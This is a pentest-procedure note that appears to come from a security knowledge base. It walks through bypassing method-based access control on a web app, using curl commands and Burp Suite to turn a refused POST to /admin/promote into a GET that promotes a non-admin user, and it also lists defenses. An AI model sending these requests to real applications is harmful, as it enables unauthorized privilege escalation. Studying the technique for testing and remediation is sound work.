---
id: 777fda65-727e-4bd2-ac87-848ddc1972d5
name: Bypass-Method-Based-Access-Control
type: procedure
verified: true
submitted: true
created_at: '2020-08-31T19:19:59.458475+00:00'
updated_at: '2023-05-26T18:49:48.483999+00:00'
platforms:
  - Web
tags:
  - access control
  - Web Applications
tactics:
  - '[[Privilege Escalation]]'
techniques:
  - '[[Exploitation for Privilege Escalation]]'
sub_techniques: []
commands:
  - '[[commands/curl-admin-login]]'
  - '[[commands/curl-upgrade-user-post]]'
  - '[[commands/curl-nonadmin-attempt]]'
  - '[[commands/curl-method-bypass-get]]'
tools:
  - '[[tools/Burp-Suite]]'
validated: true
---

# Bypass-Method-Based-Access-Control

## Summary

This procedure demonstrates how to bypass method-based access controls in web applications by modifying HTTP request methods, such as changing a POST request to GET, to perform restricted administrative actions like user privilege escalation without proper authorization checks.

## Description

Many web applications enforce access controls based on HTTP methods, restricting sensitive operations (e.g., user promotion) to specific methods like POST while assuming others like GET are safe. An attacker with low-privilege access can intercept requests using a proxy tool like Burp Suite, replay them with modified methods, and bypass these checks to escalate privileges. This technique exploits poor implementation of method enforcement and is common in RESTful APIs or legacy web apps. The scenario targets a user management endpoint where admins can promote users, but non-admins are blocked—until the method is altered.

## Requirements

1. Access to a vulnerable web application with user authentication (admin and non-admin accounts).
2. Burp Suite or similar proxy for intercepting and modifying HTTP requests.
3. Knowledge of the target endpoint (e.g., /promote) and required parameters (e.g., username).
4. Session cookies or tokens from both admin and non-admin logins.

## Defense

Defensive measures and detection strategies:

- Implement proper method enforcement on all endpoints using server-side validation (e.g., check Content-Type and method explicitly).
- Use role-based access control (RBAC) that validates user permissions regardless of request method.
- Monitor for anomalous requests, such as GET methods on POST-only endpoints, via WAF rules or API gateways.
- Enable logging of all HTTP methods and parameters to detect method tampering attempts.

## Objectives

1. Gain unauthorized access to admin functions using a non-privileged account.
2. Escalate a user's privileges (e.g., promote to admin) without detection.
3. Demonstrate the vulnerability for reporting or remediation.

## Instructions

### Step 1: Login as Admin and Capture Session

**Context**: Authenticate as an admin user to obtain a valid session cookie, which will be used to establish the baseline request for the restricted action.

**Command** ([[commands/curl-admin-login]]):
```bash
curl -X POST -d "username=admin&password=adminpass" -c cookies.txt https://target.com/login
```

> This command sends a POST request to the login endpoint, storing the session cookie in cookies.txt. Expected output includes a 200 OK response with a redirect to the dashboard or a success message indicating login.

### Step 2: Perform Admin Action and Intercept Request

**Context**: Use the admin session to execute the restricted action (e.g., promote user 'carlos' to admin) and intercept the request to understand the normal flow.

**Command** ([[commands/curl-upgrade-user-post]]):
```bash
curl -X POST -b cookies.txt -d "username=carlos&action=promote" https://target.com/admin/promote -v
```

> Run this with Burp Suite proxy enabled (--proxy 127.0.0.1:8080) to intercept. Expected output: 200 OK with confirmation (e.g., "User promoted successfully"), and verify in the app that 'carlos' is now admin.

### Step 3: Login as Non-Admin and Attempt Restricted Action

**Context**: Authenticate as a non-admin user (e.g., 'weiner') and attempt the same action to confirm access denial, capturing the unauthorized response.

**Command** ([[commands/curl-nonadmin-attempt]]):
```bash
curl -X POST -b nonadmin_cookies.txt -d "username=carlos&action=promote" https://target.com/admin/promote -v
```

> Intercept with Burp. Expected output: 403 Forbidden or "Unauthorized" message, confirming the access control is enforced for non-admins.

### Step 4: Modify Request Method to Bypass Control

**Context**: Replay the intercepted non-admin request in Burp Repeater, first testing an invalid method like POSTX to confirm parameter errors, then switch to GET to bypass the method check.

**Command** ([[commands/curl-method-bypass-get]]):
```bash
curl -X GET -b nonadmin_cookies.txt "https://target.com/admin/promote?username=weiner&action=promote" -v
```

> In Burp, right-click the request > Change request method > GET, update username to target (e.g., 'weiner'), and resend. Expected output: 200 OK with success message (e.g., "User promoted"), indicating bypass success. Verify the promotion in the application.
